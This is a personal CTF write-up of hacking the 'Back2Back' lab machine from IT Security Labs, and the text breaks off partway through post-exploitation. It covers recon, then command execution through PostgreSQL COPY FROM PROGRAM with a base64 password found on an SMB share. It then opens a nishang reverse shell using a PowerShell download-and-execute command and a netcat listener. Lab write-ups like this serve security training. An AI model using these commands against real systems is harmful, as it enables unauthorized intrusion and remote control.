---
title: Write-up Back2Back on ITSL
author: eMVee
date: 2021-11-08 20:00:00 +0800
categories: [CTF, ITSL]
tags: [ITSL, OSCP]
render_with_liquid: false
---

IT Security Labs has created a new OSCP like vulnerable Windows machine. I downloaded the machine and imported it into my pentest lab environment. 
It is practice time! Let's have some fun while hacking this new machine.

## ITSL - Back2Back writeup

As soon as both machines were up and running and I was logged in to kali, I first checked my IP address. 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(eMVee@kali)-[~]
└─$ ip a        
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 08:00:27:92:dd:a0 brd ff:ff:ff:ff:ff:ff
    inet 10.0.2.15/24 brd 10.0.2.255 scope global dynamic noprefixroute eth0
       valid_lft 546sec preferred_lft 546sec
    inet6 fe80::a00:27ff:fe92:dda0/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

As usual my kali machine runs on 10.0.2.15 in my pentest lab. Although I always check my IP address and it is always the same IP address, I do check this because it could sporadically be different.
After this I perform a ping sweep with fping to see which machines are present in my network.                                                          

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(eMVee@kali)-[~]
└─$ fping -ag 10.0.2.0/24 2>/dev/null 
10.0.2.1
10.0.2.2
10.0.2.3
10.0.2.15
10.0.2.27
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                    
And just to be sure, I also run an arp scan. 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(eMVee@kali)-[~]
└─$ sudo arp-scan --localnet --interface eth0 
[sudo] password for eMVee: 
Interface: eth0, type: EN10MB, MAC: 08:00:27:92:dd:a0, IPv4: 10.0.2.15
Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
10.0.2.1        52:54:00:12:35:00       QEMU
10.0.2.2        52:54:00:12:35:00       QEMU
10.0.2.3        08:00:27:5c:ca:00       PCS Systemtechnik GmbH
10.0.2.27       08:00:27:91:36:d4       PCS Systemtechnik GmbH

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.9.7: 256 hosts scanned in 1.919 seconds (133.40 hosts/sec). 4 responded

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                                                                 
The two results show me that there is an IP address in my network that I hadn't seen before last week.
The IP address is: 10.0.2.27. This must be the IP address of Back2Back. To make my life a bit easier and not to have to type an IP address every time, I will store it in a variable.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(eMVee@kali)-[~]
└─$ ip=10.0.2.27
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

After I stored the IP address in a variable “ip”, I can call it in the shell with “$ip”.
I use nmap because I would like to know which ports are open and which services are running on them. I run an aggressive scan that returns a lot of information.

The command I use is:  **sudo nmap -sS -T4 -p- -A $ip**
* -sS   - SYN scan
* -T4   - Speed, almost the most insane one, yes this will be detected
* -p-   - All ports
* -A    - Agressive scan, returning all kind of information such as versions and operating system



~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(eMVee@kali)-[~]
└─$ sudo nmap -sS -T4 -p- -A $ip             
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-08 20:00 CET
Nmap scan report for 10.0.2.27
Host is up (0.00071s latency).
Not shown: 65518 closed ports
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Windows Server 2012 Datacenter 9200 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
| rdp-ntlm-info: 
|   Target_Name: WIN-KBP5VDTN99V
|   NetBIOS_Domain_Name: WIN-KBP5VDTN99V
|   NetBIOS_Computer_Name: WIN-KBP5VDTN99V
|   DNS_Domain_Name: WIN-KBP5VDTN99V
|   DNS_Computer_Name: WIN-KBP5VDTN99V
|   Product_Version: 6.2.9200
|_  System_Time: 2021-11-09T03:02:05+00:00
| ssl-cert: Subject: commonName=WIN-KBP5VDTN99V
| Not valid before: 2021-11-02T05:17:46
|_Not valid after:  2022-05-04T05:17:46
|_ssl-date: 2021-11-09T03:02:13+00:00; +7h59m59s from scanner time.
5432/tcp  open  postgresql         PostgreSQL DB 9.6.0 or later
5666/tcp  open  tcpwrapped
5985/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8080/tcp  open  http               Apache httpd
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
8443/tcp  open  ssl/https-alt
| fingerprint-strings: 
|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     HTTP/1.1 404
|     Content-Length: 18
|     Document not found
|   GetRequest: 
|     HTTP/1.1 302
|     Content-Length: 0
|_    Location: /index.html
| http-title: NSClient++
|_Requested resource was /index.html
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2021-11-05T04:17:09
|_Not valid after:  2022-11-05T04:17:09
|_ssl-date: TLS randomness does not represent time
12489/tcp open  tcpwrapped
47001/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49159/tcp open  msrpc              Microsoft Windows RPC
49160/tcp open  msrpc              Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8443-TCP:V=7.91%T=SSL%I=7%D=11/8%Time=618973E8%P=x86_64-pc-linux-gn
SF:u%r(GetRequest,74,"HTTP/1\.1\x20302\r\nContent-Length:\x200\r\nLocation
SF::\x20/index\.html\r\n\r\n\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
SF:\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"
SF:)%r(HTTPOptions,36,"HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDo
SF:cument\x20not\x20found")%r(FourOhFourRequest,36,"HTTP/1\.1\x20404\r\nCo
SF:ntent-Length:\x2018\r\n\r\nDocument\x20not\x20found")%r(RTSPRequest,36,
SF:"HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocument\x20not\x20fo
SF:und")%r(SIPOptions,36,"HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\
SF:nDocument\x20not\x20found");
MAC Address: 08:00:27:91:36:D4 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Microsoft Windows 2012|7|8.1
OS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_7:::ultimate cpe:/o:microsoft:windows_8.1
OS details: Microsoft Windows Server 2012 R2 Update 1, Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1
Network Distance: 1 hop
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 9h35m58s, deviation: 3h34m40s, median: 7h59m58s
|_nbstat: NetBIOS name: WIN-KBP5VDTN99V, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:91:36:d4 (Oracle VirtualBox virtual NIC)
| smb-os-discovery: 
|   OS: Windows Server 2012 Datacenter 9200 (Windows Server 2012 Datacenter 6.2)
|   OS CPE: cpe:/o:microsoft:windows_server_2012::-
|   Computer name: WIN-KBP5VDTN99V
|   NetBIOS computer name: WIN-KBP5VDTN99V\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-11-08T19:02:05-08:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-11-09T03:02:05
|_  start_date: 2021-11-09T02:57:52

TRACEROUTE
HOP RTT     ADDRESS
1   0.71 ms 10.0.2.27

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 123.38 seconds

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Nmap returns the results after 123 seconds. As usual, I write down the most notable information in a bulleted list so that I can find it quickly. 

* Windows Server 2012 Datacenter
* Target_Name: WIN-KBP5VDTN99V
* Port 139 
    * Netbios
* Port 445
    * SMB shares
        * smb-security-mode: account_used: guest
* Port 3389
    * RDP
* Port 5432
    * postgresql db 9.6.0 or later
* Port 5985
    * Microsoft HTTPAPI httpd 2.0
* Port 8080
    * Apache httpd
* Port 8443
    * HTTP
    * Title: NSClient++
* Port 47001
    * Microsoft HTTPAPI httpd 2.0

It is a Windows Server 2012 Datacenter. A machine name is already shared through the netbios to nmap.
Because the netbios on port 139 and port 445 are open, the first thing I think about is the SMB shares that may be present on this machine.


First I decide to use enum4linux to see what information I can find. Usernames may be shown to me in this way. 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(eMVee@kali)-[~]
└─$ enum4linux $ip              
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Nov  8 20:14:48 2021

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.0.2.27
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ================================================= 
|    Enumerating Workgroup/Domain on 10.0.2.27    |
 ================================================= 
[+] Got domain/workgroup name: WORKGROUP

 ========================================= 
|    Nbtstat Information for 10.0.2.27    |
 ========================================= 
Looking up status of 10.0.2.27
        WIN-KBP5VDTN99V <00> -         B <ACTIVE>  Workstation Service
        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
        WIN-KBP5VDTN99V <20> -         B <ACTIVE>  File Server Service

        MAC Address = 08-00-27-91-36-D4

 ================================== 
|    Session Check on 10.0.2.27    |
 ================================== 
[+] Server 10.0.2.27 allows sessions using username '', password ''

 ======================================== 
|    Getting domain SID for 10.0.2.27    |
 ======================================== 
Could not initialise lsarpc. Error was NT_STATUS_ACCESS_DENIED
[+] Can't determine if host is part of domain or part of a workgroup

 =================================== 
|    OS information on 10.0.2.27    |
 =================================== 
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 10.0.2.27 from smbclient: 
[+] Got OS info for 10.0.2.27 from srvinfo:
Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED

 ========================== 
|    Users on 10.0.2.27    |
 ========================== 
[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED

[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED

 ====================================== 
|    Share Enumeration on 10.0.2.27    |
 ====================================== 
do_connect: Connection to 10.0.2.27 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.0.2.27

 ================================================= 
|    Password Policy Information for 10.0.2.27    |
 ================================================= 
[E] Unexpected error from polenum:


[+] Attaching to 10.0.2.27 using a NULL share

[+] Trying protocol 139/SMB...

        [!] Protocol failed: Cannot request session (Called Name:10.0.2.27)

[+] Trying protocol 445/SMB...

        [!] Protocol failed: SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)


[E] Failed to get password policy with rpcclient


 =========================== 
|    Groups on 10.0.2.27    |
 =========================== 

[+] Getting builtin groups:

[+] Getting builtin group memberships:

[+] Getting local groups:

[+] Getting local group memberships:

[+] Getting domain groups:

[+] Getting domain group memberships:

 ==================================================================== 
|    Users on 10.0.2.27 via RID cycling (RIDS: 500-550,1000-1050)    |
 ==================================================================== 
[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.

 ========================================== 
|    Getting printer info for 10.0.2.27    |
 ========================================== 
Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED


enum4linux complete on Mon Nov  8 20:14:49 2021
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



Unfortunately, enum4linux didn't give me the information I was hoping to get. I did receive confirmation of the target's hostname.
In addition, I see that the default name for the workgroup: “WORKGROUP” is used. 
• machine name: WIN-KBP5VDTN99V
• Workgroup: WORKGROUP

Because port 139 and port 445 are open, I would like to take a look around which shares are available on the target.
SBM shares can be used just like an FTP service to share files. With smbclient I can see which shares are being shared, I enter the following command in my terminal: **smbclient -N -L \\\\$ip**
* -N This option is for no password
* -L This option allows you to look at what services are available on a server.
* \\\\$ip


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(eMVee@kali)-[~]
└─$ smbclient -N -L \\\\$ip     

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backups         Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Shares          Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.0.2.27 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


The default folders are always present, but what immediately strikes me is that there are two extra folders.
This concerns the following folders: 
* backups
* Shares

The backups folder strikes me the first, this is because of the name where things are often stored. The name Shares is generic and could contain even more information that could be of interest to me as an attacker. I decide to connect to the backups folder  **smbclient  //$ip/backups **


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(eMVee@kali)-[~]
└─$ smbclient  //$ip/backups 
Enter WORKGROUP\eMVee's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Fri Nov  5 06:07:46 2021
  ..                                  D        0  Fri Nov  5 06:07:46 2021
  useful_info.txt                     A       54  Fri Nov  5 06:11:11 2021

                8042751 blocks of size 4096. 4642759 blocks available
smb: \> 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

As soon as I see that I can get to the backups folder I type the command **dir** to see which files are shared.
Although only 1 exists, the file *useful_info.txt* stands out to me because of its name.
I'll have to take a closer look at this file later and I decide to download the file by typing the command **get** followed by the file name.
Then I close the session. 


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
smb: \> get useful_info.txt 
getting file \useful_info.txt of size 54 as useful_info.txt (13.2 KiloBytes/sec) (average 13.2 KiloBytes/sec)
smb: \> exit
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

There was a second folder that I think sounds interesting. This was *shares* and I decide to immediately check what's there.                                   


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(eMVee@kali)-[~]
└─$ smbclient  //$ip/shares 
Enter WORKGROUP\eMVee's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Fri Nov  5 06:05:10 2021
  ..                                  D        0  Fri Nov  5 06:05:10 2021
  backups                             D        0  Fri Nov  5 06:07:46 2021

                8042751 blocks of size 4096. 4642759 blocks available
smb: \> cd backups\
smb: \backups\> dir
  .                                   D        0  Fri Nov  5 06:07:46 2021
  ..                                  D        0  Fri Nov  5 06:07:46 2021
  useful_info.txt                     A       54  Fri Nov  5 06:11:11 2021

                804275
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


I see that this is a folder above the backup folder, and the file is the same size, has the same date and time, so I'm leaving this file because it will be 99% the same.
After closing the session, I would like to take a look at the file in the terminal. With **cat useful_info.txt** I can view the contents of the file in the terminal. 


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(eMVee@kali)-[~]
└─$ cat useful_info.txt                               
Postgressuser: postgres
Password:TXlkYXRhYmFzZTEyMw==   
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
         
The file shows a username and password in base64. This is easily recognized by the two == characters at the end.
I also note this information in my notes so that I can quickly access it again if I need it. 
* username: postgres
* Password is in base64 ‘TXlkYXRhYmFzZTEyMw==’

Since the password is base64 encrypted, I can easily decrypt it via the terminal with **echo TXlkYXRhYmFzZTEyMw== | base64 -d**. 
                                                                                                                                                                        

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(eMVee@kali)-[~]
└─$ echo TXlkYXRhYmFzZTEyMw== | base64 -d
Mydatabase123  
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

So the password is quite simple and I write it down next to the username. 
* Password: Mydatabase123

Since a username and password for postgresql is now known, I also want to know if there are known exploits for postgresql db 9.6.0.
First I search for postgresql like this: **searchsploit postgresql**, I do this so that I see all possible exploits first. If there are too many, I will run it again with a version number. 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(eMVee@kali)-[~]
└─$ searchsploit postgresql
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                             |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
PostgreSQL - 'bitsubstr' Buffer Overflow                                                                                                                                                                   | linux/dos/33571.txt
PostgreSQL 6.3.2/6.5.3 - Cleartext Passwords                                                                                                                                                               | immunix/local/19875.txt
PostgreSQL 7.x - Multiple Vulnerabilities                                                                                                                                                                  | linux/dos/25076.c
PostgreSQL 8.01 - Remote Reboot (Denial of Service)                                                                                                                                                        | multiple/dos/946.c
PostgreSQL 8.2/8.3/8.4 - UDF for Command Execution                                                                                                                                                         | linux/local/7855.txt
PostgreSQL 8.3.6 - Conversion Encoding Remote Denial of Service                                                                                                                                            | linux/dos/32849.txt
PostgreSQL 8.3.6 - Low Cost Function Information Disclosure                                                                                                                                                | multiple/local/32847.txt
PostgreSQL 8.4.1 - JOIN Hashtable Size Integer Overflow Denial of Service                                                                                                                                  | multiple/dos/33729.txt
PostgreSQL 9.3 - COPY FROM PROGRAM Command Execution (Metasploit)                                                                                                                                          | multiple/remote/46813.rb
PostgreSQL 9.4-0.5.3 - Privilege Escalation                                                                                                                                                                | linux/local/45184.sh
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

When scanning through the results I don't see PostgreSQL db 9.6.0 back. I do notice the following exploit *PostgreSQL 9.3 - COPY FROM PROGRAM Command Execution (Metasploit)*.
The version doesn't match, but the command Execution capability sounds interesting. I decide to continue searching with Google.


My search terms which I used are: [postgresql COPY FROM PROGRAM Command Execution windows](https://www.google.com/search?q=postgresql+COPY+FROM+PROGRAM+Command+Execution+windows&ei=E4GJYcqfJMuWsAeZl6TYAQ&oq=postgresql+COPY+FROM+PROGRAM+Command+Execution+windows&gs_lcp=Cgxnd3Mtd2l6LXNlcnAQAzoHCAAQRxCwAzoECAAQEzoICAAQFhAeEBM6BggAEBYQHjoFCCEQoAE6BwghEAoQoAFKBAhBGABQqQlYgiRg9SVoAXACeACAAXOIAcsFkgEDOC4xmAEAoAECoAEByAEIwAEB&sclient=gws-wiz-serp&ved=0ahUKEwiK9bSuxon0AhVLC-wKHZkLCRsQ4dUDCA0&uact=5) in Google. One of the search results on [Medium](https://medium.com/r3d-buck3t/command-execution-with-postgresql-copy-command-a79aef9c2767) catches my eye and I decide to open it and read it. Another similar article is on [trustwave](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/authenticated-arbitrary-command-execution-on-postgresql-9-3/). 

The way commands are executed here from a database seems very interesting and can be executed according to trustwave's blog on PostgreSQL 9.3 > Latest versionI decide to copy the steps to my notes so that if the information is no longer available I will still have for a later moment. 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
To perform the attack, you simply follow these steps:

1) [Optional] Drop the table you want to use if it already exists

DROP TABLE IF EXISTS cmd_exec;

2) Create the table you want to hold the command output

CREATE TABLE cmd_exec(cmd_output text);

3) Run the system command via the COPY FROM PROGRAM function

COPY cmd_exec FROM PROGRAM ‘id’;

4) [Optional] View the results

SELECT * FROM cmd_exec;

5) [Optional] Clean up after yourself

DROP TABLE IF EXISTS cmd_exec;
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



First I have to log in to the PostgreSQL database. This can be done with *psql*, which is standard in Kali. The command I'm using looks like this: **psql -U postgres -p 5432 -h $ip**. The command consists of a number of arguments: 
* -U for the username
* -p for the port number
* -h for the host

I will not provide the password in the command, I will enter it when prompted. 


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(eMVee@kali)-[~]
└─$ psql -U postgres -p 5432 -h $ip
Password for user postgres: 
psql (13.4 (Debian 13.4-3), server 9.6.23)
Type "help" for help.

postgres=# help
You are using psql, the command-line interface to PostgreSQL.
Type:  \copyright for distribution terms
       \h for help with SQL commands
       \? for help with psql commands
       \g or terminate with semicolon to execute query
       \q to quit
postgres=# 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Logging in as postgres to the PostgreSQL database is successful and with help I quickly checked some basic commands that can help me.
I copy the command drop the table “cmd_exec” if it exists and paste it into the session and hit enter. 


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
postgres=# DROP TABLE IF EXISTS cmd_exec;
DROP TABLE
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

The table has been dropped and I copy the second command, paste it into my PostgreSQL database session and hit enter. 


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
postgres=# CREATE TABLE cmd_exec(cmd_output text);
CREATE TABLE
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

The table has been successfully created after which I copy the third command and change 'id' to 'whoami', then I press enter. 


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
postgres=# COPY cmd_exec FROM PROGRAM 'whoami';
COPY 1
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

The command was executed successfully and now I have to run a query to see the result.
The query is simple, but to avoid typos I copy it and paste it into my database session and hit enter. 


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
postgres=# SELECT * FROM cmd_exec;
         cmd_output          
-----------------------------
 win-kbp5vdtn99vsvc-postgres
(1 row)

postgres=#
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
I see in the table that I got a username *(svc-postgres)* back. This is a service account for PostgreSQL.
Since the **whoami** command is successfully executed, it should also be possible to start a reverse shell as this user.
A reverse shell, which is often successful, is that of nishang.

I copy the *Invoke-PowerShellTcp.ps1* into my folder where I work and I rename the file to *shell.ps1* so I don't have to type so much. 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(eMVee@kali)-[~/Documents/Back2Back]
└─$ cp ~/Documents/Usefull/nishang/Shells/Invoke-PowerShellTcp.ps1 .

┌──(eMVee@kali)-[~/Documents/Back2Back]
└─$ mv Invoke-PowerShellTcp.ps1 shell.ps1
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Once the file is renamed, I open it with Visual Code to put the following line at the bottom of the script: **Invoke-PowerShellTcp -Reverse -IPAddress 10.0.2.15 -Port 4455**
When the script is opened now it will create a reverse shell to my machine on port 4455. 
![Image](/assets/img/WriteUp/ITSL/Back2Back/ITSL-Back2Back-1.png){: width="700" height="400" }

It is important to get the script on my target. I start a python3 web server with the command: **sudo python3 -m http.server 80**.
This way I can just make a url from my IP address and I don't have to name a port in the URL. 


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(eMVee@kali)-[~/Documents/Back2Back]
└─$ sudo python3 -m http.server 80 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Once the web server is up and running, I also start the listener in netcat with the command: **nc -lvp 4455**. 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(eMVee@kali)-[~/Documents/Back2Back]
└─$ nc -lvp 4455
listening on [any] 4455 ...

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Now comes the most important step, downloading my shell on the target. Since we can execute commands like **whoami** via PostgreSQL, we could also download the file with powershell and start it. I search on Google for a way to download a file with Powershell and I come across a book on Google Books, in which I am unfortunately very little allowed to read, but I can see what I need. 
![Image](/assets/img/WriteUp/ITSL/Back2Back/ITSL-Back2Back-2.png){: width="700" height="400" }


I modify the command to the following: **COPY cmd_exec FROM PROGRAM 'powershell -exec bypass -c iex(new-object net.webclient).downloadstring(''http://10.0.2.15/shell.ps1'')';** and I press enter in the database session. I get a COPY 0 as a response, this means that it didn't go well. I check my command again and I'm really convinced that this should work. So I was thinking there’s more than one Way to skin a cat. A colleague I often work with has worked a lot with Powershell as an administrator and I explain my problem to him. Alternatively, the file could first be brought to the machine with a generic download command and then run. It may be two steps to perform, but if it works, it works. :smiley:

In the database session I run the two commands, the first to download and save the file. And the second calls the script again. 
  

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
COPY cmd_exec FROM PROGRAM 'powershell -exec bypass Invoke-WebRequest -Uri http://10.0.2.15/shell.ps1 -OutFile shell.ps1';
COPY cmd_exec FROM PROGRAM 'powershell -exec bypass ./shell.ps1';
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


After the commands have been executed, I see a connection in the terminal in my netcat listener. 


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(eMVee@kali)-[~/Documents/Back2Back]
└─$ nc -lvp 4455
listening on [any] 4455 ...
10.0.2.27: inverse host lookup failed: Unknown host
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.27] 49165
Windows PowerShell running as user svc-postgres on WIN-KBP5VDTN99V
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Program Files\PostgreSQL\9.6\data>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

In my reverse shell I see that I am connected to WIN-KBP5VDTN99V as user svc-postgres.
First I decide to run the command **dir** to see which files are present in the current folder. 


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
PS C:\Program Files\PostgreSQL\9.6\data>dir


    Directory: C:\Program Files\PostgreSQL\9.6\data


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
d----         11/3/2021  10:00 PM            base                              
d----         11/9/2021  11:43 AM            global                            
d----         11/3/2021  10:00 PM            pg_clog                           
d----         11/3/2021  10:00 PM            pg_commit_ts                      
d----         11/3/2021  10:00 PM            pg_dynshmem                       
d----         11/9/2021  11:42 AM            pg_log                            
d----         11/3/2021  10:00 PM            pg_logical                        
d----         11/3/2021  10:00 PM            pg_multixact                      
d----         11/9/2021  11:42 AM            pg_notify                         
d----         11/3/2021  10:00 PM            pg_replslot                       
d----         11/3/2021  10:00 PM            pg_serial                         
d----         11/3/2021  10:00 PM            pg_snapshots                      
d----         11/4/2021   8:33 PM            pg_stat                           
d----         11/9/2021   1:58 PM            pg_stat_tmp                       
d----         11/3/2021  10:00 PM            pg_subtrans                       
d----         11/3/2021  10:00 PM            pg_tblspc                         
d----         11/3/2021  10:00 PM            pg_twophase                       
d----         11/3/2021  10:00 PM            pg_xlog                           
-a---         11/4/2021  10:41 AM       4179 pg_hba.conf                       
-a---         11/3/2021  10:00 PM       1678 pg_ident.conf                     
-a---         11/3/2021  10:00 PM          4 PG_VERSION                        
-a---         11/3/2021  10:00 PM         90 postgresql.auto.conf              
-a---         11/3/2021  10:01 PM      23220 postgresql.conf                   
-a---         11/9/2021  11:42 AM         93 postmaster.opts                   
-a---         11/9/2021  11:42 AM         61 postmaster.pid                    
-a---         11/9/2021   1:57 PM       4400 shell.ps1                         


PS C:\Program Files\PostgreSQL\9.6\data>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

My shell.ps1 is also stored in the current directory, further I see files and directories which I'm not interested in at the moment.
I would like to escalate my privileges as soon as possible, but also I would like to know what home directories are present. After all, I still have to conquer a flag as a low priveleged user.
First I decide to go to c:\ and see which folders are present.


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
PS C:\Program Files\PostgreSQL\9.6\data> cd c:\
PS C:\> dir


    Directory: C:\


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
d----         11/4/2021   8:17 PM            DevTools                          
d----         7/26/2012  12:44 AM            PerfLogs                          
d-r--         11/4/2021   9:17 PM            Program Files                     
d----         11/4/2021   8:02 PM            Program Files (x86)               
d----         11/4/2021  10:05 PM            Shares                            
d-r--         11/4/2021   1:49 PM            Users                             
d----         11/4/2021   8:17 PM            Windows   
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
         
I see that there is a Shares folder present and I believe this is the folder that was previously viewed via smbclient. I see a DevTools folder and I decide to remember it for a while.
For now I just want to navigate to the Users folder to see which users are in it. 


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
PS C:\> cd Users\
PS C:\Users> dir


    Directory: C:\Users


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
d----         11/3/2021  10:03 PM            Administrator                     
